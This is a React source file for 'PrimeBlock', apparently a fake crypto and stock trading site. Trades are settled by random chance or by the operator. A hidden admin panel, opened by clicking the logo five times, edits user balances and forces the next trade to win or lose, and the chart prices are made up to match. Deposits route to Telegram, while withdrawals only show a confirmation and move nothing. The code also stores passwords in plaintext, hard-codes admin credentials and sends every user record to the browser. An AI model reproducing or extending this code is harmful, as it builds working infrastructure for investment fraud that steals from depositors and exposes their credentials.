import React, { useState, useEffect, useRef } from 'react';
import './App.css';
import WithdrawModal from './WithdrawModal';
import TradeResultModal from './TradeResultModal';
import { db } from './firebase';
import {
  collection,
  doc,
  getDocs,
  setDoc,
  updateDoc,
  onSnapshot,
  query,
  where
} from 'firebase/firestore';

function App() {
  // --- DATA PERSISTENCE (Firebase Firestore) ---
  const [allUsers, setAllUsers] = useState({});
  const [isLoadingUsers, setIsLoadingUsers] = useState(true);
  const [activeId, setActiveId] = useState(() => localStorage.getItem('active_user_id') || null);
  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('is_logged_in') === 'true');

  // --- STATE MANAGEMENT ---
  const [coins, setCoins] = useState([]);
  const [loading, setLoading] = useState(true);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [marketTab, setMarketTab] = useState('crypto'); 
  
  const [showAuth, setShowAuth] = useState(false);
  const [authMode, setAuthMode] = useState('login');
  const [authData, setAuthData] = useState({ email: '', password: '', name: '', pin: '' });

  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawPin, setWithdrawPin] = useState('');
  const [showProfileWithdraw, setShowProfileWithdraw] = useState(false);
  const [showAdmin, setShowAdmin] = useState(false);
  const [adminSearchId, setAdminSearchId] = useState('');
  const [clickCount, setClickCount] = useState(0);

  const [selectedCoin, setSelectedCoin] = useState(null);
  const [tradeConfig, setTradeConfig] = useState({ time: 30, amount: 10, type: 'Long' });
  const [isTrading, setIsTrading] = useState(false);
  const [countdown, setCountdown] = useState(0); 
  const [tradeResult, setTradeResult] = useState(null);
  const [showResultModal, setShowResultModal] = useState(false);
  const [nextTradeResult, setNextTradeResult] = useState('Random');
  const [adminNewBalance, setAdminNewBalance] = useState('');
  const [ohlcData, setOhlcData] = useState([]);
  const [coinStats, setCoinStats] = useState(null);
  const [tradeHistory, setTradeHistory] = useState([]);
  const chartContainerRef = useRef(null);

  // Trade configuration object
  const tradeOptions = {
    30: { profit: 0.15, minAmount: 500 },
    60: { profit: 0.30, minAmount: 3000 },
    90: { profit: 0.50, minAmount: 10000 },
    120: { profit: 0.70, minAmount: 100000 }
  };

  const calculateRSI = (prices, period = 14) => {
    if (prices.length < period) return 50;

    let gains = 0;
    let losses = 0;
    for (let i = 1; i < period; i++) {
      const diff = prices[i] - prices[i - 1];
      if (diff > 0) gains += diff;
      else losses -= diff;
    }

    const avgGain = gains / period;
    const avgLoss = losses / period;
    if (avgLoss === 0) return 100;
    const rs = avgGain / avgLoss;
    return (100 - (100 / (1 + rs))).toFixed(2);
  };

  const CandlestickChart = ({ data, width, height }) => {
    if (!data || data.length === 0) return <div style={{ color: '#999', textAlign: 'center', padding: '20px' }}>Loading chart...</div>;

    const minPrice = Math.min(...data.map(d => d.low)) * 0.99;
    const maxPrice = Math.max(...data.map(d => d.high)) * 1.01;
    const range = maxPrice - minPrice;

    const yScale = (price) => ((maxPrice - price) / range) * height;
    const xScale = (index) => (index / (data.length - 1)) * width;

    return (
      <svg width={width} height={height} style={{ background: 'rgba(0,0,0,0.2)', borderRadius: '8px' }}>
        {[0, 0.25, 0.5, 0.75, 1].map((pct, idx) => (
          <line key={idx} x1="0" y1={yScale(minPrice + range * pct)} x2={width} y2={yScale(minPrice + range * pct)} stroke="#2b3139" strokeWidth="1" strokeDasharray="4" />
        ))}
        {data.map((candle, idx) => {
          const x = xScale(idx);
          const openY = yScale(candle.open);
          const closeY = yScale(candle.close);
          const highY = yScale(candle.high);
          const lowY = yScale(candle.low);
          const isGreen = candle.close >= candle.open;
          const color = isGreen ? '#0ecb81' : '#f6465d';

          return (
            <g key={idx}>
              <line x1={x} y1={highY} x2={x} y2={lowY} stroke={color} strokeWidth="2" opacity="0.6" />
              <rect x={x - 3} y={Math.min(openY, closeY)} width={6} height={Math.max(1, Math.abs(closeY - openY))} fill={color} />
            </g>
          );
        })}
        <text x="5" y="15" fontSize="11" fill="#999">${maxPrice.toFixed(2)}</text>
        <text x="5" y={height - 5} fontSize="11" fill="#999">${minPrice.toFixed(2)}</text>
      </svg>
    );
  };

  const telegramLink = "https://t.me/PrimeBlockLTS";

  const globalMarkets = [
    { id: 'gold', name: 'Gold', symbol: 'XAU', current_price: 2342.50, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [2330, 2335, 2345, 2340, 2342] } },
    { id: 'silver', name: 'Silver', symbol: 'XAG', current_price: 28.15, image: 'https://cdn-icons-png.flaticon.com/512/5833/5833860.png', sparkline_in_7d: { price: [27.5, 28.0, 27.8, 28.2, 28.15] } },
    { id: 'oil', name: 'Crude Oil', symbol: 'WTI', current_price: 82.40, image: 'https://cdn-icons-png.flaticon.com/512/3014/3014023.png', sparkline_in_7d: { price: [80, 81, 83, 82, 82.4] } },
    { id: 'apple', name: 'Apple Inc.', symbol: 'AAPL', current_price: 189.45, image: 'https://cdn-icons-png.flaticon.com/512/0/747.png', sparkline_in_7d: { price: [185, 187, 188, 190, 189.45] } }
  ];

  // --- FIRESTORE INITIALIZATION ---
  useEffect(() => {
    // Initialize default admin user if not exists
    const initializeDefaultUser = async () => {
      try {
        const usersRef = collection(db, 'users');
        const adminQuery = query(usersRef, where('email', '==', 'admin@cp88.com'));
        const adminSnapshot = await getDocs(adminQuery);

        if (adminSnapshot.empty) {
          // Create default admin user
          const adminData = {
            id: '88135',
            email: 'admin@cp88.com',
            balance: 5000,
            name: 'Ben Admin',
            pass: '123',
            pin: '1111',
            createdAt: new Date()
          };
          await setDoc(doc(db, 'users', '88135'), adminData);
        }
      } catch (error) {
        console.error('Error initializing default user:', error);
      }
    };

    initializeDefaultUser();

    // Real-time listener for all users
    const unsubscribe = onSnapshot(collection(db, 'users'), (snapshot) => {
      const usersData = {};
      snapshot.forEach((doc) => {
        usersData[doc.id] = doc.data();
      });
      console.log('Firestore users loaded:', Object.keys(usersData).length, 'users');
      setAllUsers(usersData);
      setIsLoadingUsers(false);
    });

    return () => unsubscribe();
  }, []);

  // --- FETCH TRADE HISTORY ---
  useEffect(() => {
    if (!activeId) {
      setTradeHistory([]);
      return;
    }

    const fetchTradeHistory = async () => {
      try {
        const tradesQuery = query(collection(db, 'trades'), where('userId', '==', activeId));
        const tradesSnapshot = await getDocs(tradesQuery);
        const trades = [];
        tradesSnapshot.forEach((doc) => {
          trades.push(doc.data());
        });
        // Sort by timestamp descending
        trades.sort((a, b) => new Date(b.timestamp.seconds * 1000) - new Date(a.timestamp.seconds * 1000));
        setTradeHistory(trades);
      } catch (error) {
        console.error('Error fetching trade history:', error);
      }
    };

    fetchTradeHistory();
  }, [activeId]);

  // --- LIVE PRICE TICKING (Updates every 10s) ---
  useEffect(() => {
    const fetchPrices = () => {
      fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&sparkline=true')
        .then(res => res.json())
        .then(data => { setCoins(data); setLoading(false); })
        .catch(err => console.error("Fetch error:", err));
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 10000);
    return () => clearInterval(interval);
  }, []);

  // --- FETCH OHLC DATA FOR CANDLESTICK CHART ---
  useEffect(() => {
    if (!selectedCoin) return;

    const generateCandleData = async () => {
      try {
        const response = await fetch(`https://api.coingecko.com/api/v3/coins/${selectedCoin.id}/ohlc?vs_currency=usd&days=30`);
        const data = await response.json();

        if (Array.isArray(data) && data.length > 0) {
          const formattedData = data.map((candle, idx) => ({
            time: idx,
            open: candle[1],
            high: candle[2],
            low: candle[3],
            close: candle[4]
          }));

          setOhlcData(formattedData);

          const closes = formattedData.map(c => c.close);
          const highest = Math.max(...closes);
          const lowest = Math.min(...closes);
          const trend = formattedData[formattedData.length - 1].close >= formattedData[0].open ? 'up' : 'down';
          const change = ((closes[closes.length - 1] - closes[0]) / closes[0] * 100).toFixed(2);

          setCoinStats({
            high24h: highest,
            low24h: lowest,
            trend,
            changePercent: change,
            rsi: calculateRSI(closes)
          });
        }
      } catch (err) {
        console.error("OHLC fetch error:", err);
      }
    };

    generateCandleData();
  }, [selectedCoin]);

  // --- SESSION MANAGEMENT (LocalStorage) ---
  useEffect(() => {
    localStorage.setItem('active_user_id', activeId || '');
    localStorage.setItem('is_logged_in', isLoggedIn);
  }, [activeId, isLoggedIn]);

  const handleAuth = async (e) => {
    e.preventDefault();
    console.log('Login attempt for email:', authData.email);
    console.log('Available users:', Object.keys(allUsers).length);

    const existingUser = Object.values(allUsers).find(u => u.email === authData.email);

    if (existingUser) {
      if (existingUser.pass === authData.password) {
        setActiveId(existingUser.id);
        setIsLoggedIn(true);
        alert("Welcome back!");
      } else {
        alert("Invalid Credentials");
      }
    } else {
      if (authMode === 'signup') {
        try {
          const newId = '88' + Math.floor(1000 + Math.random() * 9000);
          const newUserData = {
            id: newId,
            email: authData.email,
            balance: 0,
            name: authData.name,
            pass: authData.password,
            pin: authData.pin,
            createdAt: new Date()
          };

          await setDoc(doc(db, 'users', newId), newUserData);
          setActiveId(newId);
          setIsLoggedIn(true);
          alert("Account created successfully!");
        } catch (error) {
          console.error('Error creating user:', error);
          alert("Error creating account. Please try again.");
        }
      } else {
        alert("Email not found. Please sign up first.");
      }
    }

    setShowAuth(false);
  };

  const startTrade = (type) => {
    if (!isLoggedIn) return setShowAuth(true);
    
    const config = tradeOptions[tradeConfig.time];
    if (!config) return alert("Invalid trade duration");
    if (tradeConfig.amount < config.minAmount) return alert(`Minimum investment for ${tradeConfig.time}s is $${config.minAmount}`);
    if (allUsers[activeId].balance < tradeConfig.amount) return alert("Insufficient Balance");
    
    setIsTrading(true);
    setCountdown(tradeConfig.time);
    
    const timer = setInterval(() => {
      setCountdown(p => {
        if (p <= 1) {
          clearInterval(timer);
          return 0;
        }
        return p - 1;
      });
    }, 1000);

    setTimeout(async () => {
      const currentPrice = selectedCoin.current_price;
      let win = nextTradeResult === 'Win' ? true : nextTradeResult === 'Lose' ? false : Math.random() > 0.5;
      const change = win ? tradeConfig.amount * config.profit : -tradeConfig.amount;
      
      // Calculate open and close prices based on logic
      let openPrice, closePrice;
      if (win) {
        const randomOffset = Math.random() * 3 + 2; // Random between 2 and 5
        if (type === 'Long') {
          openPrice = currentPrice - randomOffset;
          closePrice = currentPrice;
        } else { // Short
          openPrice = currentPrice + randomOffset;
          closePrice = currentPrice;
        }
      } else {
        // For losses, make it reasonable - close price moves against the position
        if (type === 'Long') {
          openPrice = currentPrice + 1;
          closePrice = currentPrice - 1;
        } else { // Short
          openPrice = currentPrice - 1;
          closePrice = currentPrice + 1;
        }
      }

      try {
        const userRef = doc(db, 'users', activeId);
        const newBalance = allUsers[activeId].balance + change;
        await updateDoc(userRef, { balance: newBalance });

        // Generate order ID
        const orderId = 'PB' + Date.now() + Math.floor(Math.random() * 1000);

        const tradeData = {
          orderId,
          userId: activeId,
          asset: selectedCoin.symbol.toUpperCase(),
          type,
          duration: tradeConfig.time,
          amount: tradeConfig.amount,
          openPrice,
          closePrice,
          win,
          profit: change,
          timestamp: new Date()
        };

        // Store trade in Firebase
        await setDoc(doc(collection(db, 'trades'), orderId), tradeData);

        setTradeResult({ ...tradeData, currentPrice });
        setIsTrading(false);
        setShowResultModal(true);
      } catch (error) {
        console.error('Error processing trade:', error);
        alert('Error processing trade. Please try again.');
        setIsTrading(false);
      }
    }, tradeConfig.time * 1000);
  };

  // --- PAGE ROUTING ---
  if (currentPage === 'profile') {
    const user = allUsers[activeId] || { id: 'N/A', balance: 0, name: 'Guest' };
    return (
      <div className="profile-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Back</button>
          <h3>Account Center</h3>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="profile-container">
          <div className="profile-card">
            <div className="user-avatar-large">👤</div>
            <h2>{user.name}</h2>
            <p className="user-id-tag">UID: {user.id}</p>
            <div className="balance-display">
              <span>Total Assets (USDT)</span>
              <h1>${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</h1>
            </div>
          </div>
          <div className="profile-actions">
            <button className="deposit-btn" onClick={() => window.open(telegramLink)}>💳 Buy Crypto</button>
            <button className="withdraw-btn" onClick={() => isLoggedIn ? setShowProfileWithdraw(true) : setShowAuth(true)}>📤 Withdraw</button>
          </div>
          
          {/* Trade History Section */}
          <div className="history-section">
            <h3>Trade History</h3>
            <div className="history-table-container">
              <table className="history-table">
                <thead>
                  <tr>
                    <th>Order ID</th>
                    <th>Asset</th>
                    <th>Type</th>
                    <th>Amount</th>
                    <th>Profit/Loss</th>
                    <th>Date</th>
                  </tr>
                </thead>
                <tbody>
                  {tradeHistory.length > 0 ? tradeHistory.map((trade) => (
                    <tr key={trade.orderId}>
                      <td>{trade.orderId}</td>
                      <td>{trade.asset}</td>
                      <td>{trade.type}</td>
                      <td>${trade.amount.toLocaleString()}</td>
                      <td className={trade.win ? 'profit-positive' : 'profit-negative'}>
                        {trade.win ? '+' : '-'}${Math.abs(trade.profit).toFixed(2)}
                      </td>
                      <td>{new Date(trade.timestamp.seconds * 1000).toLocaleDateString()}</td>
                    </tr>
                  )) : (
                    <tr>
                      <td colSpan="6" style={{textAlign: 'center', color: '#999'}}>No trades yet</td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        <WithdrawModal
          isOpen={showProfileWithdraw}
          onClose={() => setShowProfileWithdraw(false)}
          user={user}
          onWithdraw={(amount, address) => {
            // Handle withdrawal logic here
            alert("Request Submitted");
          }}
        />
      </div>
    );
  }

  if (currentPage === 'menu') {
    return (
      <div className="menu-page">
        <header className="trade-header no-border">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Close</button>
          <div className="brand-logo" onClick={() => { setClickCount(c => c+1); if(clickCount >= 4) setShowAdmin(true); }}>PRIMEBLOCK</div>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="menu-grid">
          <div className="menu-item glass gold" onClick={() => {setMarketTab('crypto'); setCurrentPage('home');}}><div className="menu-icon">🚀</div><span>Crypto</span></div>
          <div className="menu-item glass blue" onClick={() => {setMarketTab('stocks'); setCurrentPage('home');}}><div className="menu-icon">🏦</div><span>Global</span></div>
          <div className="menu-item glass green" onClick={() => window.open(telegramLink)}><div className="menu-icon">💰</div><span>Deposit</span></div>
          <div className="menu-item glass red" onClick={() => isLoggedIn ? setShowWithdraw(true) : setShowAuth(true)}><div className="menu-icon">💸</div><span>Withdraw</span></div>
          {isLoggedIn && <div className="menu-item glass logout" onClick={() => {setIsLoggedIn(false); setActiveId(null); setCurrentPage('home');}}><div className="menu-icon">🚪</div><span>Logout</span></div>}
        </div>
      </div>
    );
  }

  if (currentPage === 'trade' && selectedCoin) {
    return (
      <div className="trade-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Home</button>
          <div className="coin-meta"><strong>{selectedCoin.symbol.toUpperCase()}/USDT</strong></div>
          <div className="live-price-top">${selectedCoin.current_price.toLocaleString()}</div>
        </header>
        {isTrading && <div className="countdown-overlay"><div className="timer-circle"><span className="time-left">{countdown}s</span></div></div>}
        
        {/* Market Stats */}
        {coinStats && (
          <div className="market-stats">
            <div className={`stat-box ${coinStats.trend === 'up' ? 'trend-up' : 'trend-down'}`}>
              <span className="stat-label">24h Trend</span>
              <span className="stat-value">{coinStats.trend === 'up' ? '📈' : '📉'} {coinStats.changePercent}%</span>
            </div>
            <div className="stat-box">
              <span className="stat-label">24h High</span>
              <span className="stat-value">${coinStats.high24h.toLocaleString()}</span>
            </div>
            <div className="stat-box">
              <span className="stat-label">24h Low</span>
              <span className="stat-value">${coinStats.low24h.toLocaleString()}</span>
            </div>
            <div className={`stat-box ${coinStats.rsi > 70 ? 'overbought' : coinStats.rsi < 30 ? 'oversold' : ''}`}>
              <span className="stat-label">RSI</span>
              <span className="stat-value">{coinStats.rsi}</span>
            </div>
          </div>
        )}

        {/* Candlestick Chart */}
        <div className="chart-container" ref={chartContainerRef}>
          <div style={{padding: '15px', fontSize: '12px', color: '#999', textAlign: 'center'}}>30-Day Candlestick Chart</div>
          <CandlestickChart data={ohlcData} width={400} height={280} />
        </div>

        {/* Trade Controls */}
        <div className="trade-controls">
          <div className="control-row">{[30, 60, 90, 120].map(t => (<button key={t} className={tradeConfig.time === t ? 'active' : ''} onClick={() => setTradeConfig({...tradeConfig, time: t})}>{t}s</button>))}</div>
          <div className="amount-section">
            <div className="amount-header"><span>Investment</span><span className="available-bal">Available: ${isLoggedIn ? allUsers[activeId].balance.toLocaleString() : '0.00'}</span></div>
            <div className="amount-input-wrapper">
              <span className="currency-prefix">$</span>
              <input type="number" value={tradeConfig.amount} onChange={(e) => setTradeConfig({...tradeConfig, amount: Number(e.target.value)})} className="advanced-input" />
              <div className="min-amount">Min: ${tradeOptions[tradeConfig.time]?.minAmount || 0}</div>
            </div>
          </div>
          <div className="action-btns"><button className="long-btn" onClick={() => startTrade('Long')} disabled={isTrading}>LONG</button><button className="short-btn" onClick={() => startTrade('Short')} disabled={isTrading}>SHORT</button></div>
        </div>
      </div>
    );
  }

  // Show loading while users data is being fetched from Firestore
  if (isLoadingUsers) {
    return (
      <div className="app-wrapper">
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', flexDirection: 'column' }}>
          <div style={{ fontSize: '24px', marginBottom: '20px' }}>🔄</div>
          <div>Loading user data...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="app-wrapper">
      <header className="header"><div className="header-icon" onClick={() => setCurrentPage('menu')}>⚙️</div><div className="header-icon" onClick={() => isLoggedIn ? setCurrentPage('profile') : setShowAuth(true)}>👤</div></header>
      <main className="main-content">
        <div className="brand-header">
          <h1>PrimeBlock</h1>
        </div>
        <div className="market-tabs-container">
          <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>Crypto</div>
          <div className={`tab-item ${marketTab === 'stocks' ? 'active-global' : ''}`} onClick={() => setMarketTab('stocks')}>Global</div>
        </div>
        <div className="dashboard-container">
          {loading ? <div className="loading">Loading Markets...</div> : (
          <table className="crypto-table">
            <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
            <tbody>{(marketTab === 'crypto' ? coins : globalMarkets).map(asset => (
              <tr key={asset.id} className="price-row">
                <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
                <td style={{textAlign:'center'}} className="price-flash">${asset.current_price.toLocaleString()}</td>
                <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>Trade</button></td>
              </tr>))}
            </tbody>
          </table>
          )}
        </div>
      </main>

      {/* --- MODALS --- */}
      {showAuth && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAuth(false)}>×</button><h2>{authMode === 'login' ? 'Login' : 'Sign Up'}</h2>
          {isLoadingUsers ? (
            <div style={{ textAlign: 'center', padding: '20px' }}>
              <div style={{ fontSize: '24px', marginBottom: '10px' }}>🔄</div>
              <div>Loading user data...</div>
            </div>
          ) : (
            <form onSubmit={handleAuth}>
              {authMode === 'signup' && <input className="login-input" placeholder="Full Name" required onChange={e => setAuthData({...authData, name: e.target.value})} />}
              <input className="login-input" type="email" placeholder="Email" required onChange={e => setAuthData({...authData, email: e.target.value})} />
              <input className="login-input" type="password" placeholder="Password" required onChange={e => setAuthData({...authData, password: e.target.value})} />
              {authMode === 'signup' && <input className="login-input" maxLength="4" placeholder="Withdrawal PIN (4 digits)" required onChange={e => setAuthData({...authData, pin: e.target.value})} />}
              <button className="buy-btn" type="submit" disabled={isLoadingUsers}>{authMode === 'login' ? 'Sign In' : 'Register'}</button>
            </form>
          )}
          <p onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="toggle-auth">{authMode === 'login' ? 'Create Account' : 'Back to Login'}</p></div></div>
      )}

      {showWithdraw && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowWithdraw(false)}>×</button><h2>Withdraw Assets</h2>
          <input className="login-input" type="number" placeholder="Amount (USDT)" />
          <input className="login-input" placeholder="Wallet Address (TRC20)" />
          <input className="login-input" type="password" maxLength="4" placeholder="Security PIN" onChange={e => setWithdrawPin(e.target.value)} />
          <button className="buy-btn" onClick={() => { if(withdrawPin === allUsers[activeId].pin) {alert("Request Submitted"); setShowWithdraw(false);} else {alert("Wrong PIN");} }}>Verify & Submit</button></div></div>
      )}

      {showAdmin && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAdmin(false)}>×</button><h3>Admin Panel</h3>
          <input className="login-input" placeholder="User ID" onChange={e => {setAdminSearchId(e.target.value); setAdminNewBalance('');}} />
          {allUsers[adminSearchId] && (
            <div>
              <p style={{marginBottom: '10px'}}>User: {allUsers[adminSearchId].name}</p>
              <p style={{marginBottom: '10px', fontSize: '12px', color: '#999'}}>Current Balance: ${allUsers[adminSearchId].balance.toFixed(2)}</p>
              <input className="login-input" placeholder="New Balance" value={adminNewBalance} onChange={e => setAdminNewBalance(e.target.value)} />
              <button className="buy-btn" style={{marginTop: '10px', marginBottom: '10px'}} onClick={async () => {
                if (adminNewBalance) {
                  try {
                    const userRef = doc(db, 'users', adminSearchId);
                    await updateDoc(userRef, { balance: Number(adminNewBalance) });
                    alert("Balance updated successfully!");
                    setAdminNewBalance('');
                  } catch (error) {
                    console.error('Error updating balance:', error);
                    alert("Error updating balance. Please try again.");
                  }
                } else {
                  alert("Please enter a balance amount");
                }
              }}>Update Balance</button>
              <select className="login-input" onChange={e => setNextTradeResult(e.target.value)}><option value="Random">Normal</option><option value="Win">Win Next</option><option value="Lose">Lose Next</option></select>
            </div>
          )}
        </div></div>
      )}

      {showResultModal && tradeResult && (
        <TradeResultModal
          isOpen={showResultModal}
          onClose={() => setShowResultModal(false)}
          tradeResult={tradeResult}
        />
      )}
    </div>
  );
}

export default App; 
